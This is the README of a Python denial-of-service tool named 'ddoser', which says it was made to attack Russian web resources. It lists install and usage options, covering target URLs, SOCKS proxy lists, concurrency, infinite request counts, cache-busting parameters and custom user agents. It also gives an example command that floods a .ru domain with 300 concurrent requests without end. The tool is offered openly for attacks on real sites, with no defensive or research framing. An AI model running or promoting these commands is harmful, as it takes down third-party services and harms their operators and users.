# The ddoser
Small application for ddos attack, was developed special for kill russian's resources :)  
## Install 
```shell
pip install -r requirements.txt
```
## Run
```shell
Usage: ddoser.py [OPTIONS]

  Run ddoser

Options:
  --target-url TEXT        ddos target url
  --target-urls-file TEXT  path or url to file contains urls to ddos
  --proxy-url TEXT         url to proxy resourse
  --proxy-file TEXT        path to file with proxy list
  --concurrency INTEGER    concurrency level
  --count INTEGER          requests count (0 for infinite)
  --timeout INTEGER        requests timeout
  --verbose                Show verbose log
  --with-random-get-param  add random get argument to prevent cache usage
  --user-agent TEXT        custom user agent
  --log-to-stdout          log to console
  --help                   Show this message and exit.
```
proxy-file or proxy-url should contain proxy list in format like:
```text
ip1:port1#sock5
ip2:port2#sock4
...
ipN:portN#sock4
```
### Example cmd
```shell
./ddoser.py --target-url https://some-domain.ru/ --concurrency 300 --timeout 60 --proxy-file proxy.list --count 0
```
## Note
**ddoser** supports only sock proxy, also can start it directly without proxy
